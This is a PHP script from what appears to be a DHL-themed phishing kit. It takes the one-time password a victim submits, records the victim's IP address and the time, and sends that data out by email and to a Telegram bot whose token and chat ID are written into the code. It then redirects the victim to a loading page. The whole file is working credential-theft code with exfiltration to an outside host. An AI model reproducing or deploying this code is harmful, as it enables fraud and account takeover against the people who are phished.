<?php
/*==============[session_include]=================*/
session_start();

$_SESSION['onetime']= $_POST['onetime'];
include ('./bdelhwayjek.php');


if(isset($_POST['onetime'])){
if(!empty($_POST['onetime'])){

/*==============[ConfiGG]=================*/
$otp    = $_POST['onetime'];
/*==============[Sander]=================*/
$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$YK = "BADEXAMPLE";
$rand = md5(microtime());
$useragent = $_SERVER['HTTP_USER_AGENT'];
$subject  = "DHL REZULTS [" .$ip. "] [" .$YK_V. "] ";
$headers .= "From: BADEXAMPLE" . "\r\n";
/*==============[Letter]=================*/
$MSG = "
 ######## DHL By ".$YK." ########
📩 OTP        =>   ".$otp."
📍  IP         =>  "."http://www.geoiptool.com/?IP=".$ip."
⏰ TIME       =>   ".$time."
 ######## DHL By ".$YK." ########
";
/*==============[Backup]=================*/


mail($yourmail, $subject, $MSG , $headers);

function functiondilih($cc)
    {
        $key = "1430045124:AAHh-LpkxYYeUE0VQ42aPQo6OcbqzL6L6es";// hat hna apikey
        $idchat ="1484446267";//hat hna id chat   
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot'.$key.'/sendMessage');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=".$idchat."&text=".$cc."");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        $headers = array();
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
        $result = curl_exec($ch);

        curl_close ($ch);
    }
    {
    $date = gmdate("H:i:s | d/m/Y");
    $victim_ip = getenv("REMOTE_ADDR");
    $MSG1 = "
 ######## DHL By ".$YK." ########
📩 OTP        =>   ".$otp."
📍  IP         =>  "."http://www.geoiptool.com/?IP=".$ip."
⏰ TIME       =>   ".$time."
 ######## DHL By ".$YK." ########
";

           

            functiondilih($MSG1);

          

            
        }
        
/*==============[header]=================*/
header("location:../load2.php?portail=".md5('BREAKINGBAD1990FUCKYOU')."&espace=".rand(100,300)."&id=".rand(8456468748,500000000)." ");


 	}else{header("Location: ../load2.php?portail=".md5('BREAKINGBAD1990FUCKYOU')."&espace=".rand(100,300)."&id=".rand(8456468748,500000000)." ");}

}else{header("Location: ../load2.php?portail=".md5('BREAKINGBAD1990FUCKYOU')."&espace=".rand(100,300)."&id=".rand(8456468748,500000000)." ");}
/*==============[Salina]=================*/